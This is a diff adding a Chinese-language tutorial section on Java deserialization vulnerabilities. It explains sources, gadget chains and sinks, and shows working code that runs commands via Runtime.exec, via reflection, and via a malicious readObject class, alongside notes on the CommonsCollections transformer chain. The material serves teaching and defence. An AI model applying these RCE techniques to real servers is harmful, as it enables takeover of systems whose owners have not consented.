@@ -189,6 +189,244 @@ public class Main {
 
 - 具有继承性,父类可以序列化那么子类同样可以（递归）
 
+### 为什么会产生安全问题？
+
+只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。
+
+**可能的形式**
+
+1. 入口类的readObject直接调用危险方法。
+
+2. 入口类参数中包含可控类，该类有危险方法，readObject时调用，比如类型定义为Object，调用equals/hashcode/toString。
+
+3. 入口类参数中包含可控类，该类又调用其他有危险方法的类，重点 相同类型 同名函数
+
+4. 构造函数/静态代码块等类加载时隐式执行。
+
+- 共同条件 继承Serializable
+
+- 入口类 source（重写readObject 参数类型宽泛 最好jdk自带，最好的例子就是HashMap）
+
+- 调用链 gadget chain
+
+- 执行类 sink （rce ssrf 写文件等等）
+
+### Java 反序列化执行系统命令
+
+在Java反序列化漏洞中，最终目标往往是执行系统命令。下面介绍三种执行系统命令的方式：
+
+#### 1. 正常执行系统命令
+
+最直接的方式是使用`Runtime.getRuntime().exec()`方法：
+
+```java
+import java.io.IOException;
+
+public class NormalExec {
+    public static void main(String[] args) {
+        try {
+            // 直接调用Runtime执行命令
+            Runtime.getRuntime().exec("calc");
+            
+            // 或者执行更复杂的命令
+            Process process = Runtime.getRuntime().exec("whoami");
+            
+            // 读取命令输出
+            java.io.BufferedReader reader = new java.io.BufferedReader(
+                new java.io.InputStreamReader(process.getInputStream())
+            );
+            String line;
+            while ((line = reader.readLine()) != null) {
+                System.out.println(line);
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+**特点：**
+
+- 简单直接，无需额外配置
+- 但在实际漏洞利用中，往往无法直接调用`Runtime`对象
+- `Runtime`类没有实现`Serializable`接口，无法被序列化
+
+#### 2. 反射执行系统命令
+
+使用Java反射机制可以绕过一些限制，动态调用`Runtime`类的方法：
+
+**方式1：使用`Class.forName()`完整的反射调用链**
+
+```java
+import java.lang.reflect.Method;
+
+public class ReflectionExec1 {
+    public static void main(String[] args) {
+        try {
+            // 通过Class.forName获取Runtime类
+            Class<?> runtimeClass = Class.forName("java.lang.Runtime");
+            // 获取getRuntime方法
+            Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");
+            // 调用getRuntime方法获取Runtime实例
+            Object runtime = getRuntimeMethod.invoke(null);
+            // 获取exec方法
+            Method execMethod = runtimeClass.getMethod("exec", String.class);
+            // 调用exec方法执行命令
+            execMethod.invoke(runtime, "calc");
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+**方式2：使用`Runtime.class`直接获取类对象**
+
+```java
+import java.lang.reflect.Method;
+
+public class ReflectionExec2 {
+    public static void main(String[] args) {
+        try {
+            // 直接使用Runtime.class获取类对象
+            Class<?> runtimeClass = Runtime.class;
+            // 获取getRuntime方法
+            Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");
+            // 调用getRuntime方法获取Runtime实例
+            Runtime runtime = (Runtime) getRuntimeMethod.invoke(null);
+            // 获取exec方法
+            Method execMethod = runtimeClass.getMethod("exec", String.class);
+            // 调用exec方法执行命令
+            execMethod.invoke(runtime, "calc");
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+**反射执行的完整链路：**
+
+```
+Runtime.class 
+  → getMethod("getRuntime") 
+  → invoke(null) 
+  → getMethod("exec", String.class) 
+  → invoke(runtime, "calc")
+```
+
+**为什么使用Runtime.class而不是Runtime.getRuntime()？**
+
+- `Runtime.getRuntime()`返回的是`java.lang.Runtime`对象，无法序列化
+- `Runtime.class`返回的是`java.lang.Class`对象，实现了`Serializable`接口，可以被序列化
+
+#### 3. 反序列化执行系统命令
+
+在反序列化场景中，通过重写`readObject()`方法，在反序列化时自动执行命令：
+
+```java
+import java.io.*;
+import java.lang.reflect.Method;
+
+public class DeserializeExec {
+    public static void main(String[] args) {
+        try {
+            // 第一步：序列化恶意对象到文件
+            System.out.println("=== 开始序列化 ===");
+            MaliciousObject obj = new MaliciousObject("open -a claculator");
+            serialize(obj, "malicious.ser");
+            System.out.println("对象已序列化到文件: malicious.ser");
+            
+            System.out.println("\n=== 开始反序列化 ===");
+            // 第二步：从文件中反序列化对象（此时会触发命令执行）
+            MaliciousObject deserializedObj = (MaliciousObject) deserialize("malicious.ser");
+            System.out.println("对象已反序列化，命令已执行");
+            System.out.println("对象属性 name: " + deserializedObj.name);
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    // 序列化方法：将对象写入文件
+    public static void serialize(Object obj, String fileName) throws IOException {
+        FileOutputStream fos = new FileOutputStream(fileName);
+        ObjectOutputStream oos = new ObjectOutputStream(fos);
+        oos.writeObject(obj);
+        oos.close();
+        fos.close();
+    }
+    
+    // 反序列化方法：从文件中读取对象
+    public static Object deserialize(String fileName) throws IOException, ClassNotFoundException {
+        FileInputStream fis = new FileInputStream(fileName);
+        ObjectInputStream ois = new ObjectInputStream(fis);
+        Object obj = ois.readObject();
+        ois.close();
+        fis.close();
+        return obj;
+    }
+}
+
+// 恶意类：必须实现Serializable接口
+class MaliciousObject implements Serializable {
+    private static final long serialVersionUID = 1L;
+    public String command;  // 改为command，用于指定要执行的命令
+    
+    public MaliciousObject(String command) {
+        this.command = command;
+    }
+    
+    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        ois.defaultReadObject();
+        
+        System.out.println("readObject方法被调用，开始执行命令: " + command);
+        
+        try {
+            Runtime.getRuntime().exec(command);
+            System.out.println("命令执行成功！");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+**关键点：**
+
+1. **必须实现`Serializable`接口** - 这是序列化的前提条件
+
+2. **重写`readObject()`方法** - 使用特定的方法签名：
+
+   ```java
+   private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException
+   ```
+
+3. **调用`defaultReadObject()`** - 保证对象能正常反序列化：
+
+   ```java
+   ois.defaultReadObject();
+   ```
+
+   如果不调用此方法，对象的属性将无法被正确还原
+
+4. **反序列化自动触发** - 当服务端调用`readObject()`反序列化数据时，会自动执行重写的`readObject()`方法中的恶意代码
+
+**这就是反序列化漏洞的核心原理：**
+
+- 攻击者构造包含恶意`readObject()`方法的序列化对象
+- 服务端反序列化时自动执行`readObject()`中的代码
+- 从而实现远程命令执行(RCE)
+
+**为什么这样危险？**
+
+- 服务端无法控制`readObject()`中执行的代码
+- 只要反序列化数据，就会自动执行恶意代码
+- 攻击者可以执行任意系统命令，完全控制服务器
+
 ### Java 反序列化漏洞利用链条分析
 
 #### URLDNS 链
@@ -423,7 +661,7 @@ r.exec("calc"); //调用exec
 new Transformer[]{
   new ConstantTransformer(Runtime.class), //返回Runtime类
 
-  new InvokerTransformer("getMethod",			//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
+  new InvokerTransformer("getMethod",   //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
     new Class[]{String.class, class[].class},
     new Object[]{"getRuntime", new Class[0]})
 }
@@ -521,7 +759,7 @@ Object o = declaredConstructor.newInstance(Retention.class, tmap);
     }
 ```
 
-核心逻辑就是 `Iterator var4 = this.memberValues.entrySet().iterator();` 和` var5.setValue(...)`
+核心逻辑就是 `Iterator var4 = this.memberValues.entrySet().iterator();` 和`var5.setValue(...)`
 
 memberValues 就是反序列化后得到的 Map，也是经过了 TransformedMap 修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用 setValue 设置值的时候就会触发 TransformedMap 里注册的 Transform，进而执行我们为其精心设计的任意代码。
 
